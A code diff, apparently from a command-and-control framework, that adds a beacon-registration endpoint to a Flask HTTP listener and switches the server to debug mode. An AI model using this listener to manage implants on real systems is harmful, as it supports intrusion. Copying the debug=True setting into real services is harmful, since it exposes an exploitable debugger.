@@ -1,8 +1,11 @@
 import sys
 import threading
 
-from flask import Flask, render_template, request
+from core.logger import *
+from random import choice
+from string import ascii_letters
 from multiprocessing import Process
+from flask import Flask, render_template, request
 
 class HTTP_listener:
     def __init__(self, name, ip, port):
@@ -18,20 +21,25 @@ class HTTP_listener:
 
         @self.app.route('/', methods=['GET'])
         def index():
-            return 'Hello there!'
+            return ('Hello there!')
 
-        @self.app.route('/test', methods=['GET'])
-        def test():
-            return 'Test there!'
+        @self.app.route('/beacon/register', methods=['POST'])
+        def register():
+            beacon_name = ''.join(choice(ascii_letters) for i in range(10))
+            beacon_ip = request.remote_addr
+            beacon_hostname = request.form.get("name")
+            beacon_type = request.form.get("type")
+            success(f'New undercover agent {beacon_name}.')
+            return (beacon_name, 200)
         
         @self.app.errorhandler(404)
         def page_not_found(error):
-            return render_template(f'404.html', title = '404'), 404
+            return (render_template(f'404.html', title = '404'), 404)
 
     def run(self):
         # to fix (debug False and logger True)
-        self.app.logger.disabled = True
-        self.app.run(port=self.port, host=self.ip, debug=False)
+        self.app.logger.disabled = False
+        self.app.run(port=self.port, host=self.ip, debug=True)
 
     def start(self):
         self.server = Process(name = self.name, target=self.run, args = (), daemon = True)
